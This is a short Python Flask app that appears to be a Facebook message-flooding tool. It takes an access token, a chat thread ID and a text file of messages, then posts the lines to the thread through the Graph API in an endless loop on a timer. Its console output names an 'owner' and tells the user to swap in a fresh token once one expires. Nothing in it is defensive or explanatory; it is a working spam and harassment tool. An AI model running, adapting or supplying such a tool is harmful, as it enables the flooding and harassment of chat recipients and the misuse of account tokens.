from flask import Flask, request, render_template
import requests
import time

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters)
                    if response.status_code == 200:
                        print(f"[+] MESSAGE SENT SUCCESSFULL OWNER RAZIA BIBI {message}")
                    else:
                        print(f"[+] FAILED MESSAGE SEND YOUR TOKEN IS EXPIRE CHANGE YOUR ID TOKEN OWNER RAZIA BIBI {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"ERROR MESSAGE SEND CHAK YOUR ID TOKEN OWNER RAZIA BIBI {message}")
                print(e)
                time.sleep(30)

        return "Messages sent successfully!"

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
